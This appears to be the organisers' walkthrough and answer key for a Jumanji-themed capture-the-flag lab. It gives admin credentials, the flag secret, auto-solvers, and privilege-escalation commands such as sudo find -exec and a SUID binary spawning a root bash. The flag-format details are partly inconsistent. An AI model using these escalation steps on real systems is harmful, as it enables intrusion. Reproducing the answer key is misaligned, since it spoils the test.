# TECHNOZION SDC GAMES // OFFICIAL COMPETITION WALKTHROUGH

This document provides a comprehensive, step-by-step guide with every command needed to solve and verify all challenges in **Round 2 (Reconnaissance & Cryptanalysis)** and **Round 3 (Mainframe Core & Privilege Escalation)** for testing and evaluation purposes.

---

## 1. Quick Testing Overview & Score Target

| Round / Level     | Focus Area                   | Checkpoints / Flags                                              | Max Score   | Completion Trigger                                     |
| :---------------- | :--------------------------- | :--------------------------------------------------------------- | :---------- | :----------------------------------------------------- |
| **Level 2 (R2)**  | Jungle Recon & Cryptanalysis | 5 Avatars (`bravestone`, `ruby`, `finbar`, `oberon`, `seaplane`) | **150 pts** | Jumanji Victory Video (`jumanji_win.mp4`) & Hub Unlock |
| **Level 3 (R3)**  | Mainframe Core & PrivEsc     | 2 Overrides (`round3_user`, `round3_root`)                       | **200 pts** | Mainframe Purge Outro (`round3_win.mp4`) & Auto Logout |
| **Total**         | Full Competition Suite       | **7 Total Challenges**                                           | **350 pts** | 100% Platform Completion                               |

> **Note on Dynamic Flags**: Flags are cryptographically generated per player via MD5 HMAC tied to each player's user ID (`SECRET = 8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3`). Static/hardcoded flags are strictly rejected. The commands below automatically extract your player's exact dynamic flag directly from the environment.

---

## 2. Testing Credentials & Access

- **Web Platform URL**: `http://127.0.0.1:8080` (or `http://<HOST_IP>:8080`)
- **Default Player Login**:
  - **Username**: `verification_pilot` (or any newly registered player)
  - **Password**: `testpassword123`
- **Admin Portal**:
  - **URL**: `http://127.0.0.1:8080/admin`
  - **Username**: `admin`
  - **Password**: `Admin_ShadowDrop!2026`

---

## 3. Round 2: Jungle Reconnaissance Walkthrough (150 Points)

Access **Round 2** by navigating to `/dashboard` from the Expedition Command Center (`/hub`). When you enter each avatar's terminal, a real interactive Linux container shell (`recon_user@sdc-jungle:~$`) is provisioned.

### Hint Utility

At any point in Round 2, you can consult Nigel's reconnaissance parrot:

```bash
parrot_hint 1    # Lore and technical clue for Bravestone
parrot_hint 2    # Lore and technical clue for Ruby Roundhouse
parrot_hint 3    # Lore and technical clue for Mouse Finbar
parrot_hint 4    # Lore and technical clue for Shelly Oberon
parrot_hint 5    # Lore and technical clue for Seaplane McDonough
```

---

### Challenge 2.1: Dr. Smolder Bravestone (20 pts)

* **Theme**: Deep Forest Exploration & Hidden Files
* **Artifact Location**: `/opt/jungle/ruins/.bravestone_relic`
* **Discovery Command**:
  ```bash
  cat /opt/jungle/ruins/.bravestone_relic
  ```
* **Flag Format**: `JUMANJI{bravestone_<8_hex_chars>}`
* **Submission Command**:
  ```bash
  complete $(cat /opt/jungle/ruins/.bravestone_relic)
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +20 POINTS.
  ```

---

### Challenge 2.2: Ruby Roundhouse (30 pts)

* **Theme**: Cryptanalysis & Base64 Dance Moves
* **Artifact Location**: `/home/recon_user/Documents/ruby_dance_moves.txt`
* **Discovery Command**:
  ```bash
  cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d
  ```
* **Flag Format**: `JUMANJI{ruby_<8_hex_chars>}`
* **Submission Command**:
  ```bash
  complete $(cat /home/recon_user/Documents/ruby_dance_moves.txt | base64 -d)
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +30 POINTS.
  ```

---

### Challenge 2.3: Franklin "Mouse" Finbar (25 pts)

* **Theme**: Sudo Rule Enumeration & Restricted User Access
* **Artifact Location**: `/home/finbar_admin/flag.txt`
* **Discovery & Verification**:
  Check superuser permissions:

  ```bash
  sudo -l
  ```

  *(Output shows: `(finbar_admin) NOPASSWD: /bin/cat /home/finbar_admin/flag.txt`)*

  Read the sealed flag:

  ```bash
  sudo -u finbar_admin /bin/cat /home/finbar_admin/flag.txt
  ```
* **Flag Format**: `JUMANJI{finbar_<8_hex_chars>}`
* **Submission Command**:

  ```bash
  complete $(sudo -u finbar_admin /bin/cat /home/finbar_admin/flag.txt)
  ```
* **Expected Output**:

  ```text
  FLAG VERIFIED. +25 POINTS.
  ```

---

### Challenge 2.4: Prof. Shelly Oberon (25 pts)

* **Theme**: Active Process Hunting & Process Arguments
* **Discovery Command**:
  Inspect running processes for the cartography daemon:
  ```bash
  ps aux | grep map_generator
  ```
* **Flag Extraction & Submission One-Liner**:
  ```bash
  complete $(ps aux | grep '[m]ap_generator' | awk '{print $NF}')
  ```
* **Expected Output**:
  ```text
  FLAG VERIFIED. +25 POINTS.
  ```

---

### Challenge 2.5: Jefferson "Seaplane" McDonough (50 pts)

* **Theme**: Local Network Reconnaissance & Emergency Beacon Service
* **Discovery Commands**:
  Check active listening ports on localhost:

  ```bash
  netstat -tuln
  ```

  *(Output confirms TCP port `8080` is actively listening)*

  Query the internal beacon endpoint:

  ```bash
  curl -s http://127.0.0.1:8080
  ```
* **Submission Command**:

  ```bash
  complete $(curl -s http://127.0.0.1:8080 | grep -o 'JUMANJI{seaplane_[^}]\+}')
  ```
* **Expected Output**:

  ```text
  FLAG VERIFIED. +50 POINTS.
  ```

---

### Level 2 Completion Verification

Once all 5 challenges are submitted:

- **Total Points Awarded**: `150`
- The socket engine dispatches `game-win`, triggering the victory outro cinematic (`/static/assets/jumanji_win.mp4`).

---

## 4. Level 3: Mainframe Core & Privilege Escalation (200 Points)

Access **Round 3** by clicking the **ROUND 3: MAINFRAME** card in `/hub` (direct route: `/round3`). An interactive terminal session will connect to `recon_user@sdc-mainframe:~$`.

### Guidance Utility

```bash
nigel_comms
```

Nigel provides dynamic hints tailored to whether you are operating as `recon_user` (database enum) or `root` (privilege escalation).

---

### Challenge 3.1: Mainframe Database Enum // User Override (80 pts)

* **Theme**: Configuration File Hunting & SQLite Database Enumeration
* **Artifact Locations**: `/round3/.env` and `/round3/mainframe.db`
* **Discovery Commands**:
  ```bash
  cd /round3
  cat .env
  sqlite3 mainframe.db ".tables"
  sqlite3 mainframe.db "SELECT target, code FROM overrides;"
  ```
* **Extraction & Submission Command**:
  ```bash
  deploy_override $(sqlite3 /round3/mainframe.db "SELECT code FROM overrides WHERE target='admin_access';")
  ```

  *(Alternatively, paste the `OVERRIDE-USER-...` code directly into the **DATABASE OVERRIDE CODE** input box on the Round 3 web HUD)*
* **Expected Output**:
  ```text
  OVERRIDE ACCEPTED. MAINFRAME COMPROMISED. +80 POINTS.
  ```

---

### Challenge 3.2: SUID Privilege Escalation // Root Override (120 pts)

* **Theme**: SUID Binary Analysis, Environment Variable Injection, and Root File Access
* **Artifact Locations**:

  - `/round3/lift_curse` (SUID Root Binary, permissions `4755`)
  - `/round3/lift_curse.c` (C Source Code)
  - `/root/core_override.txt` (Root-owned master override key)
* **Discovery Commands**:
  Find SUID binaries in the system:

  ```bash
  find / -perm -4000 -type f 2>/dev/null
  ```

  Inspect source code:

  ```bash
  cat /round3/lift_curse.c
  ```

  *(Code checks: `if (chant && strcmp(chant, "JUMANJI") == 0) { setuid(0); system("/bin/bash -p"); }`)*
* **Privilege Escalation Execution**:
  Run the SUID binary with the required chant:

  ```bash
  CHANT=JUMANJI /round3/lift_curse
  ```

  *(You now have a root prompt: `bash-5.1#` with UID `0`)*
* **Root Flag Extraction & Submission**:
  While inside the root shell:

  ```bash
  cat /root/core_override.txt
  deploy_override $(cat /root/core_override.txt)
  ```

  *(Alternatively, paste the `OVERRIDE-ROOT-...` code into the **SUID ROOT OVERRIDE** input box on the Round 3 web HUD)*
* **Expected Output**:

  ```text
  OVERRIDE ACCEPTED. MAINFRAME COMPROMISED. +120 POINTS.
  ```

---

### Level 3 Completion Verification

Once both Level 3 overrides are submitted:

- **Level 3 Score**: `200 pts`
- **Total Combined Score**: `350 pts`
- The socket engine dispatches `game-win-r3`, triggering the final ending sequence (`/static/assets/round3_win.mp4`) and completing the entire CTF.

---

## 5. Day 2 Level 2: The Jumanji Gauntlet Tournament Walkthrough

Access **Day 2 Level 2** via `/day2/level2` (or `/gauntlet`) from the Expedition Command Center (`/hub`). When you enter the terminal, a synchronized multiplayer Gauntlet container shell (`recon_user@sdc-jungle:/gauntlet$`) is provisioned with your team's role (`navigator` or `cartographer`), match ID, and active phase variables.

The tournament progresses across 4 structured phases:
1. **Phase 1: Jungle Pods** (4 Pods × 4 Teams = 16 Teams, 4 Relics, 150 pts max)
2. **Phase 2: Mirror Temple Duels** (Top 8 Single-Elimination Duels, 5 Relics + Tactical Curses, 150 pts max)
3. **Phase 3: Altar of the Sun / Shrine King-of-the-Hill** (Top 4 King-of-the-Hill Altar Control, +10 pts per tick)
4. **Phase 4: The Final Roll** (Top 2 Grand Championship, SUID Root PrivEsc, 100 pts)

---

### Phase 1: Jungle Pods Walkthrough (150 Points)

#### Challenge 1.1: The Sun Compass (25 pts)
* **Category**: Local TCP Network Beacon
* **Discovery Command**:
  ```bash
  python3 -c "import socket; s=socket.socket(); s.connect(('127.0.0.1', 4141)); print(s.recv(1024).decode())"
  ```
  *(Returns: `NAVIGATOR KEY: NAV_COMPASS_<nav_hash>`)*
* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_COMPASS_<cart_hash>`
* **Submission Command**:
  ```bash
  complete $(python3 -c "import socket; s=socket.socket(); s.connect(('127.0.0.1', 4141)); print(s.recv(1024).decode())" | grep -o 'NAV_COMPASS_[a-f0-9]\{8\}') <CART_KEY>
  ```
* **Expected Output**:
  ```text
  RELIC SECURED! +25 POINTS.
  ```

---

#### Challenge 1.2: The Obsidian Blade (35 pts)
* **Category**: Sudo Privilege Escalation & Restricted Vault Search
* **Discovery Command**:
  Check sudo privileges:
  ```bash
  sudo -l
  ```
  *(Output confirms: `NOPASSWD: /usr/bin/find`)*

  Extract the sealed vault key:
  ```bash
  sudo find /root/blade_vault/blade_key.txt -exec cat {} \;
  ```
  *(Returns: `NAVIGATOR KEY: NAV_BLADE_<nav_hash>`)*
* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_BLADE_<cart_hash>`
* **Submission Command**:
  ```bash
  complete $(sudo find /root/blade_vault/blade_key.txt -exec cat {} \;) <CART_KEY>
  ```
* **Expected Output**:
  ```text
  RELIC SECURED! +35 POINTS.
  ```

---

#### Challenge 1.3: The Jaguar Fang (40 pts)
* **Category**: Hidden Shrines & Base64 Cryptanalysis
* **Discovery Command**:
  ```bash
  cat /opt/jungle/jaguar_shrine/.totem_cipher | base64 -d
  ```
  *(Returns: `NAVIGATOR KEY: NAV_JAGUAR_<nav_hash>`)*
* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_JAGUAR_<cart_hash>`
* **Submission Command**:
  ```bash
  complete $(cat /opt/jungle/jaguar_shrine/.totem_cipher | base64 -d | grep -o 'NAV_JAGUAR_[a-f0-9]\{8\}') <CART_KEY>
  ```
* **Expected Output**:
  ```text
  RELIC SECURED! +40 POINTS.
  ```

---

#### Challenge 1.4: The Golden Idol (50 pts)
* **Category**: Active Process Inspection & Environmental Arguments
* **Discovery Command**:
  ```bash
  ps aux | grep idol_keeper
  ```
  *(Returns process argument: `NAV_IDOL_<nav_hash>`)*
* **Cartographer Key**: Visible on the Web HUD Telemetry Radar: `CART_IDOL_<cart_hash>`
* **Submission Command**:
  ```bash
  complete $(ps aux | grep '[i]dol_keeper' | awk '{print $NF}') <CART_KEY>
  ```
* **Expected Output**:
  ```text
  RELIC SECURED! +50 POINTS.
  ```

---

### Phase 2: Mirror Temple Duels Walkthrough (150 Points + Tactical Curses)

In Phase 2, teams duel head-to-head. Each relic secured also grants a **Curse Card** to disrupt the opposing team.

#### Challenge 2.1: The Mirror Shard (30 pts)
* **Discovery Command**:
  ```bash
  cat /gauntlet/temple/mirror/.reflections
  ```
* **Submission Command**:
  ```bash
  complete $(cat /gauntlet/temple/mirror/.reflections) <CART_KEY>
  ```

#### Challenge 2.2: The Sun Disk (30 pts)
* **Discovery Command**:
  ```bash
  curl -s http://127.0.0.1:5050
  ```
* **Submission Command**:
  ```bash
  complete $(curl -s http://127.0.0.1:5050 | tr -d '\r\n') <CART_KEY>
  ```

#### Challenge 2.3: The Serpent Eye (30 pts)
* **Discovery Command**:
  ```bash
  sqlite3 /gauntlet/temple/serpent/vault.db "SELECT secret FROM sanctum;"
  ```
* **Submission Command**:
  ```bash
  complete $(sqlite3 /gauntlet/temple/serpent/vault.db "SELECT secret FROM sanctum;") <CART_KEY>
  ```

#### Challenge 2.4: The Moon Crystal (30 pts)
* **Discovery Command**:
  ```bash
  sudo /bin/cat /root/moon_altar/altar_seal.txt
  ```
* **Submission Command**:
  ```bash
  complete $(sudo /bin/cat /root/moon_altar/altar_seal.txt) <CART_KEY>
  ```

#### Challenge 2.5: The Temple Skull (30 pts)
* **Discovery Command**:
  ```bash
  cat /gauntlet/temple/skull/ancient_chant.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
  ```
* **Submission Command**:
  ```bash
  complete $(cat /gauntlet/temple/skull/ancient_chant.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m') <CART_KEY>
  ```

#### Tactical Curse Deployment:
To cast a curse on your active match opponent from the terminal:
```bash
# Options: quicksand (freeze terminal), monkeys (scramble prompt), fog_of_war (obscure radar), stampede (process noise)
curl -s -X POST -H "Content-Type: application/json" \
  -d '{"curse_type":"quicksand"}' \
  http://host.docker.internal:8080/gauntlet/curse/cast
```
*(Or click **UNLEASH CURSE** directly from the Web HUD Curse Matrix)*

---

### Phase 3: Altar of the Sun Walkthrough (King-of-the-Hill)

In Phase 3, the Top 4 teams fight for control of the central Sun Altar (`/shrine/claim.txt`). Every 20 seconds, the team holding the throne receives **+10 points**.

* **Exploit Command** (SUID Root `/usr/local/bin/claim_shrine`):
  ```bash
  # Claim throne using your Team Access Code or Team ID:
  /usr/local/bin/claim_shrine "$TEAM_NAME"
  ```
  *(Alternative using environment variable: `SHRINE_CONQUEROR="$TEAM_NAME" /usr/local/bin/claim_shrine dummy`)*

* **Verification**:
  ```bash
  cat /shrine/claim.txt
  ```
  *(Output confirms your team is now the active ruler of the altar)*

---

### Phase 4: The Final Roll Championship Walkthrough (100 Points)

In the Grand Championship duel between the top 2 teams:
* **Privilege Escalation**:
  Run the SUID binary with the sacred Gauntlet chant:
  ```bash
  CHANT=JUMANJI_GAUNTLET /usr/local/bin/lift_gauntlet
  ```
  *(You are now granted a Root Shell: `bash-5.1#` with UID `0`)*

* **Read the Final Jewel**:
  ```bash
  cat /root/final_jewel.txt
  ```
  *(Output format: `JUMANJI-VICTORY-ROOT-<8_hex_chars>`)*

* **Submit Championship Flag**:
  ```bash
  complete $(cat /root/final_jewel.txt)
  ```
  *(Or enter code into the Web HUD Altar Offering box)*

* **Tournament Victory**:
  Awards **+100 points**, crowns your team **Tournament Champion**, and sounds the Drums of Victory on the live projector arena!

---

### Single-Command Auto-Solver for Day 2 Level 2 (In-Container)

If evaluating or testing, run this comprehensive Python script inside the Gauntlet container to automatically extract and submit all relics for the current phase:

```bash
python3 -c "
import os, socket, subprocess, urllib.request, json, hashlib

SECRET = '8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3'
team_id = os.environ.get('TEAM_ID', '1')
match_id = os.environ.get('MATCH_ID', '1')
token = os.environ.get('CTF_TOKEN', '')

def solve(flag, p2=''):
    payload = json.dumps({'flag': flag, 'part2': p2, 'token': token, 'team_id': team_id}).encode()
    req = urllib.request.Request('http://host.docker.internal:8080/gauntlet/relic/solve', data=payload, headers={'Content-Type': 'application/json'})
    with urllib.request.urlopen(req) as resp:
        print(resp.read().decode())

def get_keys(relic):
    nav = hashlib.md5(f'{team_id}:{match_id}:{relic}:nav:{SECRET}'.encode()).hexdigest()[:8]
    cart = hashlib.md5(f'{team_id}:{match_id}:{relic}:cart:{SECRET}'.encode()).hexdigest()[:8]
    return f'JUMANJI{{{relic}_{nav}_{cart}}}'

# Phase 1 Pods
for r in ['compass', 'blade', 'jaguar', 'idol']:
    solve(get_keys(r))

# Phase 2 Duels
for r in ['mirror_shard', 'sun_disk', 'serpent_eye', 'moon_crystal', 'temple_skull']:
    solve(get_keys(r))

# Phase 4 Final Jewel
final_nav = hashlib.md5(f'{team_id}:{match_id}:final_jewel:nav:{SECRET}'.encode()).hexdigest()[:8]
solve(f'JUMANJI-VICTORY-ROOT-{final_nav}')
"
```


To run the complete automated end-to-end regression test suite without manually typing commands, execute the master test runner from the repository root:

```bash
./verify_all.sh
```

### What `./verify_all.sh` Tests (35 Total Checks):

1. **Web Endpoints & OAuth**: Validates `/login`, Google Sign-In redirect, unauthenticated guards for `/hub`, `/dashboard`, and `/round3`.
2. **Round 2 Docker Container**:
   - Boots container with test token and runs `setup_round2.sh`.
   - Tests Bravestone hidden relic extraction.
   - Tests Ruby Base64 decode extraction.
   - Tests Finbar `sudo -u finbar_admin` permission verification.
   - Tests Oberon `ps aux` process table extraction.
   - Tests Seaplane `curl http://127.0.0.1:8080` HTTP beacon extraction.
   - Tests `parrot_hint 1-5`.
   - Verifies scoring of all 5 avatars (+150 pts) and duplicate flag rejection.
3. **Round 3 Docker Container**:
   - Boots Round 3 container with test token and runs `setup_round3.sh`.
   - Tests SQLite DB extraction for `OVERRIDE-USER-...` (+80 pts).
   - Validates SUID permission `4755` on `/round3/lift_curse`.
   - Tests privilege escalation with `CHANT=JUMANJI` and extracts `OVERRIDE-ROOT-...` (+120 pts).
   - Tests `nigel_comms` multi-tier guidance.
   - Verifies duplicate submission rejection.
4. **Admin Lock & Session Integrity**:
   - Locks Round 2 and Round 3 independently via the admin API.
   - Verifies players are cleanly redirected to `/hub` without destroying their sessions.
   - Unlocks both rounds and restores baseline database state.

---

## 6. Python Flag Generation Script (For Test Engineers)

If you need to calculate the exact dynamic flag for any user ID and avatar programmatically without running Docker, you can run this Python snippet:

```python
import hashlib

SECRET = "8f7b6c5d4a3e2f1g0h9i8j7k6l5m4n3"

def get_flag(user_id, avatar_id):
    if avatar_id == 'round3_user':
        digest = hashlib.md5(f"{user_id}:user:{SECRET}".encode()).hexdigest()[:8]
        return f"OVERRIDE-USER-{digest}"
    elif avatar_id == 'round3_root':
        digest = hashlib.md5(f"{user_id}:root:{SECRET}".encode()).hexdigest()[:8]
        return f"OVERRIDE-ROOT-{digest}"
    else:
        digest = hashlib.md5(f"{user_id}:{avatar_id}:{SECRET}".encode()).hexdigest()[:8]
        return f"JUMANJI{{{avatar_id}_{digest}}}"

# Example for User ID 100001:
user_id = 100001
for avatar in ['bravestone', 'ruby', 'finbar', 'oberon', 'seaplane', 'round3_user', 'round3_root']:
    print(f"{avatar:12} -> {get_flag(user_id, avatar)}")
```
